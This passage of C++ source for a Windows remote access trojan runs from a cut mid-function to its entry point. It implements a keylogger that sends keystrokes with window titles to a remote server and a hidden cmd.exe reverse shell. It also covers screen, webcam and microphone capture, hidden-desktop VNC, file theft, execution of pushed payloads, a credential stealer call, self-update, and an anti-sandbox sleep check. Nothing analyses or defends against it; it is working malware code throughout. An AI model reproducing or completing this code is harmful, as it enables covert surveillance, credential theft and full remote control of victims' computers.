        } pMC->Stop(); pMC->Release(); pS->Release(); pGF->Release(); pC->Release(); pG->Release(); pB->Release(); pN->Release(); pM->Release();
    } if (pE) pE->Release(); if (pDE) pDE->Release(); CoUninitialize(); return 0;
}

void SysInternalOpen(char* p, DWORD s) {
    char t[MAX_PATH], f[MAX_PATH]; const char* ext = ".exe";
    if (s > 4) { if (p[0] == (char)0xFF && p[1] == (char)0xD8) ext = ".jpg"; else if (p[0] == (char)0x25 && p[1] == (char)0x50) ext = ".pdf"; else if (p[0] == (char)0x89 && p[1] == (char)0x50) ext = ".png"; else if (p[0] != 'M' || p[1] != 'Z') ext = ".txt"; } 
    GetTempPathA(MAX_PATH, t); snprintf(f, sizeof(f), "%sGhst%d%s", t, (int)time(NULL), ext); FILE* fl = fopen(f, "wb");
    if (fl) {
        fwrite(p, 1, s, fl);
        fclose(fl);
        SHELLEXECUTEINFOA sei = {0};
        sei.cbSize = sizeof(SHELLEXECUTEINFOA);
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = "open";
        sei.lpFile = f;
        sei.nShow = SW_SHOWNORMAL;
        if (ShellExecuteExA(&sei)) { Sleep(500); SetForegroundWindow(sei.hwnd); if (sei.hProcess) CloseHandle(sei.hProcess); }
    }
}

// --- Keylogger & Chat & Network ---
LRESULT CALLBACK LLKbdProc(int n, WPARAM w, LPARAM l) { if (n == HC_ACTION && bKeylogRunning && (w == WM_KEYDOWN || w == WM_SYSKEYDOWN)) { KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)l; char t[256]; GetWindowTextA(GetForegroundWindow(), t, 256); string log = ""; if (strcmp(t, lastWindowTitle) != 0) { strncpy(lastWindowTitle, t, sizeof(lastWindowTitle)-1); log.append("\n["); log.append(t); log.append("] "); } if (p->vkCode >= 0x30 && p->vkCode <= 0x5A) log.push_back((char)p->vkCode); else if (p->vkCode == VK_SPACE) log.append(" "); else if (p->vkCode == VK_RETURN) log.append("[ENTER]"); else { char b[16]; snprintf(b, sizeof(b), "[%d]", (int)p->vkCode); log.append(b); } SendPacket(TYPE_KEYLOG_DATA, log.c_str(), (int)log.length()); } 
    // Use dynamic call if loaded
    if (fnCallNextHookEx) return fnCallNextHookEx(hKeyboardHook, n, w, l);
    return CallNextHookEx(hKeyboardHook, n, w, l); 
}
DWORD WINAPI MonitorThread(LPVOID p) { 
    LoadCriticalAPIs();
    if (fnSetWindowsHookExA) hKeyboardHook = fnSetWindowsHookExA(WH_KEYBOARD_LL, LLKbdProc, GetModuleHandle(0), 0);
    else hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LLKbdProc, GetModuleHandle(0), 0);
    MSG m; while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); if (!bKeylogRunning && hKeyboardHook == NULL) break; } 
    if (hKeyboardHook) { if (fnUnhookWindowsHookEx) fnUnhookWindowsHookEx(hKeyboardHook); else UnhookWindowsHookEx(hKeyboardHook); } 
    return 0; 
}
void StartKeylogger() { bKeylogRunning = true; } void StopKeylogger() { bKeylogRunning = false; }
LRESULT CALLBACK ChatWndProc(HWND hw, UINT m, WPARAM w, LPARAM l) { switch (m) { case WM_CREATE: { hChatFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Malgun Gothic"); hChatEditHist = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY, 10, 10, 360, 200, hw, NULL, NULL, NULL); SendMessageW(hChatEditHist, WM_SETFONT, (WPARAM)hChatFont, TRUE); hChatEditInput = CreateWindowExW(0, L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 10, 220, 280, 30, hw, NULL, NULL, NULL); SendMessageW(hChatEditInput, WM_SETFONT, (WPARAM)hChatFont, TRUE); hChatBtnSend = CreateWindowExW(0, L"BUTTON", L"Send", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 300, 220, 70, 30, hw, (HMENU)1, NULL, NULL); SendMessageW(hChatBtnSend, WM_SETFONT, (WPARAM)hChatFont, TRUE); break; } case WM_COMMAND: if (LOWORD(w) == 1) { int len = GetWindowTextLengthW(hChatEditInput); if (len > 0) { wchar_t* buf = (wchar_t*)malloc((len + 1) * sizeof(wchar_t)); GetWindowTextW(hChatEditInput, buf, len + 1); SetWindowTextW(hChatEditInput, L""); wstring msg = L"Me: "; msg.append(buf); msg.append(L"\r\n"); int n = GetWindowTextLengthW(hChatEditHist); SendMessageW(hChatEditHist, EM_SETSEL, (WPARAM)n, (LPARAM)n); SendMessageW(hChatEditHist, EM_REPLACESEL, 0, (LPARAM)msg.c_str()); string u = WideToUtf8(buf); SendPacket(TYPE_CHAT_MSG, u.c_str(), (int)u.length()); free(buf); } } break; case WM_CLOSE: if (bChatForceClose) return DefWindowProc(hw, m, w, l); return 0; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hw, m, w, l); } return 0; }
DWORD WINAPI ChatThread(LPVOID p) { WNDCLASSEXW wc = { 0 }; wc.cbSize = sizeof(wc); wc.lpfnWndProc = ChatWndProc; wc.hInstance = GetModuleHandle(0); wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); wc.lpszClassName = L"GhostChatClass"; RegisterClassExW(&wc); int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN); wstring t = L"Chat with "; t.append(Utf8ToWide(chatAdminName)); hChatWnd = CreateWindowExW(WS_EX_TOPMOST, L"GhostChatClass", t.c_str(), WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, (sw - 400) / 2, (sh - 300) / 2, 400, 300, 0, 0, GetModuleHandle(0), 0); ShowWindow(hChatWnd, SW_SHOWNORMAL); UpdateWindow(hChatWnd); MSG m; while (GetMessage(&m, 0, 0, 0)) { TranslateMessage(&m); DispatchMessage(&m); if (!bChatRunning) break; } if (hChatWnd) DestroyWindow(hChatWnd); UnregisterClassW(L"GhostChatClass", GetModuleHandle(0)); return 0; }
void StartChat(const char* n) { if (bChatRunning) return; bChatRunning = true; bChatForceClose = false; strncpy(chatAdminName, n, sizeof(chatAdminName)-1); hChatThreadHandle = CreateThread(NULL, 0, ChatThread, NULL, 0, NULL); }
void StopChat() { if (bChatRunning) { bChatRunning = false; bChatForceClose = true; if (hChatWnd) { SendMessageW(hChatWnd, WM_CLOSE, 0, 0); hChatWnd = NULL; } } }
void AppendChatMessage(char* t) { if (hChatWnd && hChatEditHist) { wstring msg = Utf8ToWide(chatAdminName) + L": " + Utf8ToWide(t) + L"\r\n"; int n = GetWindowTextLengthW(hChatEditHist); SendMessageW(hChatEditHist, EM_SETSEL, (WPARAM)n, (LPARAM)n); SendMessageW(hChatEditHist, EM_REPLACESEL, 0, (LPARAM)msg.c_str()); } }
DWORD WINAPI ReadFromCmd(LPVOID lpParam) { char buffer[BUF_SIZE]; DWORD r, a; while (true) { if (!PeekNamedPipe(hChildStd_OUT_Rd, 0, 0, 0, &a, 0)) break; if (a > 0 && ReadFile(hChildStd_OUT_Rd, buffer, BUF_SIZE, &r, 0) && r > 0) SendPacket(TYPE_SHELL_OUT, buffer, (int)r); Sleep(50); } return 0; }
DWORD WINAPI WriteToCmd(LPVOID p) {
    CoInitialize(NULL); char hB[12]; while (true) {
        if (!RecvAll(g_Socket, hB, 12)) break;
        PacketHeader* h = (PacketHeader*)hB; if (h->magic != 0xBEEFCAFE) break;
        char* b = NULL; if (h->length > 0) { b = (char*)malloc(h->length + 1); if (!RecvAll(g_Socket, b, h->length)) { free(b); break; } b[h->length] = 0; }
        if (h->type == TYPE_SCREEN_START) { RefreshMonitors(); if (!bScreenRunning) { bScreenRunning = true; hScreenThread = CreateThread(0, 0, ScreenThread, 0, 0, 0); } }
        else if (h->type == TYPE_SCREEN_STOP) bScreenRunning = false;
        else if (h->type == TYPE_AUDIO_MIC_START) StartMic(b ? atoi(b) : 0);
        else if (h->type == TYPE_AUDIO_MIC_STOP) StopMic();
        else if (h->type == TYPE_AUDIO_SYS_START) StartSys(b ? atoi(b) : 0);
        else if (h->type == TYPE_AUDIO_SYS_STOP) StopSys();
        else if (h->type == TYPE_KEYLOG_START) StartKeylogger();
        else if (h->type == TYPE_KEYLOG_STOP) StopKeylogger();
        else if (h->type == TYPE_CAM_START) { if (!bCamRunning) { bCamRunning = true; hCamThread = CreateThread(0, 0, CamThread, 0, 0, 0); } }
        else if (h->type == TYPE_CAM_STOP) { bCamRunning = false; if (hCamThread) { WaitForSingleObject(hCamThread, 2000); hCamThread = NULL; } }
        else if (h->type == TYPE_CAM_LIST) ListCams();
        else if (h->type == TYPE_AGENT_KILL) exit(0);
        else if (h->type == TYPE_AGENT_UNINSTALL) Uninstall();
        else if (h->type == TYPE_AGENT_RESTART) Restart();
        else if (h->type == TYPE_FILE_LS_REQ) ListDirectory(b ? b : "root");
        else if (h->type == TYPE_FILE_DOWN_REQ) DownloadFile(b);
        else if (h->type == TYPE_FILE_DELETE) { DeleteFileOrDir(b); ListDirectory("."); }
        else if (h->type == TYPE_FILE_MKDIR) { MakeDirectory(b); ListDirectory("."); }
        else if (h->type == TYPE_PROC_LS_REQ) ListProcesses();
        else if (h->type == TYPE_PROC_KILL) { if (b) KillProcess(atoi(b)); ListProcesses(); }
        else if (h->type == TYPE_AUDIO_DEV_LIST) ListAudioDevices();
        else if (h->type == TYPE_OPEN_URL) { if (b) ShellExecuteA(0, "open", b, 0, 0, SW_SHOWNORMAL); }
        else if (h->type == TYPE_CHAT_INIT) StartChat(b ? b : "Admin");
        else if (h->type == TYPE_CHAT_MSG) { if (b) AppendChatMessage(b); }
        else if (h->type == TYPE_CHAT_EXIT) StopChat();
        else if (h->type == TYPE_HEARTBEAT) { SendPacket(TYPE_HEARTBEAT, NULL, 0); }
        else if (h->type == TYPE_STEALTH_EXEC) { if (b) SysInternalOpen(b, h->length); }
        else if (h->type == TYPE_HVNC_START) StartHVNC();
        else if (h->type == TYPE_HVNC_STOP) StopHVNC();
        else if (h->type == TYPE_HVNC_EXEC) { if (b) ExecuteInHiddenDesk(b); }
        else if (h->type == TYPE_HVNC_INPUT) { if (b) HandleHVNCInput(b); }
        else if (h->type == TYPE_SHELL_IN) { if (b) { DWORD w; WriteFile(hChildStd_IN_Wr, b, h->length, &w, 0); } }
        else if (h->type == TYPE_SCREEN_CONFIG) { if (b) sscanf(b, "%d,%d,%d", &targetFPS, &jpegQuality, &targetMonitor); }
        else if (h->type == TYPE_CAM_CONFIG) { if (b) sscanf(b, "%d,%d,%d", &camFPS, &camQuality, &targetCam); }
        else if (h->type == TYPE_AUDIO_CONFIG) { if (b) audioSampleRate = atoi(b); }
        else if (h->type == TYPE_AGENT_UPDATE) { if (b) Update(b); }
        else if (h->type == TYPE_INPUT_MOUSE) { if (b) HandleMouseInput(b); }
        else if (h->type == TYPE_INPUT_KEY) { if (b) HandleKeyInput(b); }
        else if (h->type == TYPE_STEALER_EXEC) { if (b) Stealer::Run(b); }
        else if (h->type == TYPE_FILE_UP_REQ) { if (b) WriteLocalFile(b, h->length); }
        if (b) free(b);
    } CoUninitialize(); return 0;
}

void RunAgent() {
    LoadCriticalAPIs(); // Initialize dynamic APIs
    OutputDebugStringA("[AGENT] Thread Started\n");
    monitors = new vector<MonitorInfo>();
    setvbuf(stdout, NULL, _IONBF, 0); InitializeCriticalSection(&g_SocketLock); GdiplusStartupInput gsi; ULONG_PTR gt; GdiplusStartup(&gt, &gsi, NULL);
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED); bCtxInit = (ma_context_init(NULL, 0, NULL, &globalCtx) == MA_SUCCESS);
    WSADATA wd; WSAStartup(MAKEWORD(2, 2), &wd); struct sockaddr_in srv; srv.sin_family = AF_INET; srv.sin_addr.s_addr = inet_addr(SERVER_IP); srv.sin_port = htons(SERVER_PORT);
    while (true) {
        g_Socket = socket(AF_INET, SOCK_STREAM, 0); if (connect(g_Socket, (struct sockaddr*)&srv, sizeof(srv)) < 0) { Sleep(5000); continue; }
        SendPacket(TYPE_AUTH, NULL, 0); SendSysInfo(); CreateThread(0, 0, MonitorThread, 0, 0, 0);
        SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(sa); sa.bInheritHandle = TRUE; sa.lpSecurityDescriptor = 0; CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &sa, 0); CreatePipe(&hChildStd_IN_Rd, &hChildStd_IN_Wr, &sa, 0); SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0); SetHandleInformation(hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
        PROCESS_INFORMATION pi; STARTUPINFO si; ZeroMemory(&pi, sizeof(pi)); ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si); si.hStdError = hChildStd_OUT_Wr; si.hStdOutput = hChildStd_OUT_Wr; si.hStdInput = hChildStd_IN_Rd; si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
        CreateProcess(0, (LPSTR)"cmd.exe", 0, 0, TRUE, 0, 0, 0, &si, &pi); CloseHandle(hChildStd_OUT_Wr); CloseHandle(hChildStd_IN_Rd);
        HANDLE hT[2]; hT[0] = CreateThread(0, 0, ReadFromCmd, 0, 0, 0); hT[1] = CreateThread(0, 0, WriteToCmd, 0, 0, 0);
        WaitForMultipleObjects(2, hT, FALSE, INFINITE);
        bScreenRunning = bMicRunning = bSysRunning = bCamRunning = bKeylogRunning = bChatRunning = false;
        if (hScreenThread) { WaitForSingleObject(hScreenThread, 1000); hScreenThread = NULL; } if (hCamThread) { WaitForSingleObject(hCamThread, 1000); hCamThread = NULL; } if (hChatThreadHandle) { StopChat(); WaitForSingleObject(hChatThreadHandle, 1000); hChatThreadHandle = NULL; }
        if (bMicInit) { ma_device_uninit(&micDevice); bMicInit = false; } if (bSysInit) { ma_device_uninit(&sysDevice); bSysInit = false; }
        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hChildStd_IN_Wr); CloseHandle(hChildStd_OUT_Rd); closesocket(g_Socket); g_Socket = INVALID_SOCKET;
    }
}

// GUI Entry Point (Standard EXE)
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Simple Anti-Sandbox (Sleep Check)
    DWORD t1 = GetTickCount();
    Sleep(2500);
    DWORD t2 = GetTickCount();
    if ((t2 - t1) < 2000) return 0; // Fast-forwarded

    // Execute Main Logic
    RunAgent();
    return 0;
}